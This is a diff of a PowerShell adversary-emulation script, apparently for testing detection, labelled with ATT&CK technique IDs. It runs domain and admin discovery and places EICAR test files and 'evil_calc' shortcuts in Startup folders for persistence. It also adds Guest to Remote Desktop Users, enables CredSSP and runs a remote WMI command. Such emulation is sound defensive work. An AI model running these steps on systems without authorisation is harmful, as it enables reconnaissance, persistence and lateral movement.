@@ -82,9 +82,6 @@ $cmd = @"
     '==== Antivirus Product ====' >> $attackDir\recon.txt
     WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,pathToSignedProductExe,pathToSignedReportingExe,productState 2>&1 >> $attackDir\recon.txt
     '' >> $attackDir\recon.txt
-    '==== Terminal Services Remote Host List (who has this system remoted into?) ====' >> $attackDir\recon.txt
-    reg query 'HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default' 2>&1 >> $attackDir\recon.txt
-    '' >> $attackDir\recon.txt
     '==== Local Administrators ====' >> $attackDir\recon.txt
     net localgroup administrators 2>&1 >> $attackDir\recon.txt 
     '' >> $attackDir\recon.txt
@@ -92,13 +89,33 @@ $cmd = @"
     net group 'domain admins' /domain 2>&1 >> $attackDir\recon.txt 
     '' >> $attackDir\recon.txt
     '==== Exchange Administrators ====' >> $attackDir\recon.txt
-    net group 'Exchange Trusted Subsystem' /domain 2>&1 >> $attackDir\recon.txt  
+    net group 'Exchange Trusted Subsystem' /domain 2>&1 >> $attackDir\recon.txt
     Start-Sleep -m $n
 "@
 Powershell.exe -nop -command $cmd
 Start-Sleep 3
-Remove-item $attackDir\recon.txt -ErrorAction Ignore -force
+Remove-item $attackDir\recon2.txt -ErrorAction Ignore -force
 
+Write-Host "Initiating Discovery - T1018 - Remote System Discovery"
+Write-Host "Upon compromise of a system, attackers need to move to more important systems. They first enumerate nearby systems to determine what is available.`n"
+$cmd = @"
+    '==== Terminal Services Remote Host List (who has this system remoted into?) ====' >> $attackDir\recon2.txt
+    reg query 'HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default' 2>&1 >> $attackDir\recon2.txt
+    '' >> $attackDir\recon2.txt
+    '==== Domain Controllers ====' >> $attackDir\recon2.txt
+    net group "domain controllers" /domain 2>&1 >> $attackDir\recon2.txt 
+    '' >> $attackDir\recon2.txt
+    '==== Local Network Systems ====' >> $attackDir\recon2.txt
+    net view /all /domain 2>&1 >> $attackDir\recon2.txt
+    Start-Sleep -m $n
+"@
+Powershell.exe -nop -command $cmd
+Start-Sleep 3
+Remove-item $attackDir\recon2.txt -ErrorAction Ignore -force
+
+# AlwaysInstallElevated Enumeration (useful to set this to 1 if your malware uses MSI to elevate privs)
+$cmd = 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1; Start-Sleep -m $n'
+Powershell.exe -nop -command $cmd
 
 Start-Sleep 10
 
@@ -152,18 +169,23 @@ powershell.exe -Win N -exec bypass -nop -command $cmd
 #Start-Sleep 2
 #Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
 
+Write-Host "Adding T1547.001 - Start Up Folder Persistence with detectable malware (EICAR File)"
+Write-Host "Downloading IECAR file..."
+Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EICAR.exe"
+
+
 Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence with detectable malware (EICAR File)"
 Write-Host "Downloading IECAR file..."
 Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "$attackDir\EICAR.exe"
+$cmd = "`$Target = `"$attackDir\EICAR.exe`"`n"
 $cmd = @'
-#$Target = "$attackDir\EICAR.exe"
-$Target = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EICAR.exe"
-$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
+$target = 'C:\windows\system32\calc.exe'
+$ShortcutLocation = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk'
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
 $Create.TargetPath = $Target
 $Create.Save()
-$ShortcutLocation = "$home\Desktop\evil_calc.lnk"
+$ShortcutLocation = 'c:\users\public\Desktop\evil_calc.lnk'
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
 $Create.TargetPath = $Target
@@ -238,17 +260,25 @@ powershell.exe -Win N -exec bypass -nop -command $cmd
 
 Start-Sleep 10
 
+
 # LATERAL MOVEMENT
 Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
 Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
 net localgroup "Remote Desktop Users" Guest /add /comment:"$n"
 Start-Sleep 3
-
 #Cleanup
 Write-Host "Removing Guest from Remote Desktop Users"
 net localgroup "Remote Desktop Users" Guest /delete
 
+# AlwaysInstallElevated Enumeration (useful to set this to 1 if your malware uses MSI to elevate privs)
+$cmd = 'Enable-WSManCredSSP Server -n $n'
+Powershell.exe -nop -command $cmd
+
+# Execute Remote Command using WMI
+wmic /node:targetcomputername process call create 'powershell.exe -command {$a = "EICARTES"; $a+= "T"; cmd.exe /c echo $a}' 2>$null
+
 Start-Sleep 10
+
 
 #### IMPACT
 Write-Host -ForegroundColor Cyan "`nStarting Impact Step"
